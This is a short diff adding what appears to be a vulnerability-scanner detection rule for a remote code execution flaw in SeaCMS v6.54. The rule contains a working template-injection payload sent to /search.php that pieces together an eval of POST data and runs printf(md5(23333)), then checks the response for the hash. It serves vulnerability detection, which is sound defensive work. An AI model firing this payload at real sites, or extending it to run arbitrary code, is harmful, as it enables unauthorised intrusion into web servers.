@@ -1,0 +1,9 @@
+name: poc-yaml-seacms-v654-rce
+rules:
+  - method: POST
+    path: /search.php
+    body: >-
+      searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&&ver=OST[9]))&9[]=prin&9[]=tf(md5(23333));
+    follow_redirects: true
+    expression: |
+      status==200 && body.bcontains(b'0ba7bc92fcd57e337ebb9e74308c811f')
